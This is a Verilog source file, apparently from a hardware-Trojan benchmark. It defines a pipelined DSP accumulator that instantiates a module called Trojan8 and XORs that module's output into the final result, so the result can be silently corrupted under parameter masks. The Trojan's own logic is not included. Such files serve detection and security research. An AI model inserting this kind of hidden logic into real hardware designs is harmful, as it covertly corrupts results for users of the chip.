// DSP Host Circuit for Trojan8
// Accumulator with feedback
module trojan8_dsp1_host #(
    parameter INPUT_WIDTH = 8,
    parameter PIPELINE_STAGES = 3,
    parameter [INPUT_WIDTH-1:0] DSP_SEED = {INPUT_WIDTH{1'b0}},
    parameter [INPUT_WIDTH*2-1:0] TROJ_MASK1 = {INPUT_WIDTH*2{1'b0}},
    parameter [INPUT_WIDTH-1:0] TROJ_MASK2 = {INPUT_WIDTH{1'b0}},
    parameter [INPUT_WIDTH*2-1:0] TROJ_MASK3 = {INPUT_WIDTH*2{1'b0}}
)(
    input wire clk,
    input wire rst,
    input wire [INPUT_WIDTH-1:0] a,
    input wire [INPUT_WIDTH-1:0] b,
    input wire [INPUT_WIDTH-1:0] c,
    input wire [INPUT_WIDTH-1:0] d,
    input wire [INPUT_WIDTH-1:0] e,
    input wire [2:0] operation_mode,
    input wire [INPUT_WIDTH-1:0] sample_in,
    input wire sample_valid,
    output reg [INPUT_WIDTH*2-1:0] dsp_result,
    output reg result_valid
);

    // Trojan interface
    wire [INPUT_WIDTH-1:0] trojan_a, trojan_b, trojan_c, trojan_d, trojan_e;
    wire [2:0] trojan_sel;  // Fixed width selector
    wire [INPUT_WIDTH*2-1:0] trojan_y;
    
    // Pipeline registers
    reg [INPUT_WIDTH-1:0] coefficients [0:PIPELINE_STAGES-1];
    reg [INPUT_WIDTH*2-1:0] pipeline_data [0:PIPELINE_STAGES-1];
    reg [PIPELINE_STAGES-1:0] pipeline_valid;
    
    // Accumulator with feedback
    reg [INPUT_WIDTH*2-1:0] accumulator;
    wire feedback_enable = operation_mode[1];
    
    // Loop variable
    integer i;
    
    assign trojan_a = a;
    assign trojan_b = b; 
    assign trojan_c = c;
    assign trojan_d = d;
    assign trojan_e = e;
    assign trojan_sel = operation_mode;
    
    // DSP pipeline
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            for (i = 0; i < PIPELINE_STAGES; i = i + 1) begin
                pipeline_data[i] <= {INPUT_WIDTH*2{1'b0}};
            end
            // Initialize coefficients
            for (i = 0; i < PIPELINE_STAGES; i = i + 1) begin
                coefficients[i] <= DSP_SEED * i;
            end
            pipeline_valid <= {PIPELINE_STAGES{1'b0}};
        end else begin
            // Stage 0: Input
            pipeline_data[0] <= sample_in * coefficients[0];
            pipeline_valid[0] <= sample_valid;
            
            // Subsequent stages
            for (i = 1; i < PIPELINE_STAGES; i = i + 1) begin
                pipeline_data[i] <= pipeline_data[i-1] + (sample_in * coefficients[i]);
                pipeline_valid[i] <= pipeline_valid[i-1];
            end
        end
    end
    
    // Accumulator with feedback logic
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            accumulator <= {INPUT_WIDTH*2{1'b0}};
        end else if (pipeline_valid[PIPELINE_STAGES-1]) begin
            if (feedback_enable) begin
                accumulator <= accumulator + pipeline_data[PIPELINE_STAGES-1];
            end else begin
                accumulator <= pipeline_data[PIPELINE_STAGES-1];
            end
        end
    end
    
    // Output with trojan integration
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            dsp_result <= {INPUT_WIDTH*2{1'b0}};
            result_valid <= 1'b0;
        end else begin
            // Mix DSP accumulator result with trojan output
            dsp_result <= accumulator ^ trojan_y;  // Use accumulator instead of direct pipeline
            result_valid <= pipeline_valid[PIPELINE_STAGES-1];
        end
    end
    
    // Instantiate Trojan8
    Trojan8 #(
        .INPUT_WIDTH(INPUT_WIDTH),
        .MASK1(TROJ_MASK1),
        .MASK2(TROJ_MASK2),
        .MASK3(TROJ_MASK3)
    ) trojan_inst (
        .a(trojan_a),
        .b(trojan_b),
        .c(trojan_c),
        .d(trojan_d),
        .e(trojan_e),
        .sel(trojan_sel),
        .y(trojan_y)
    );

endmodule
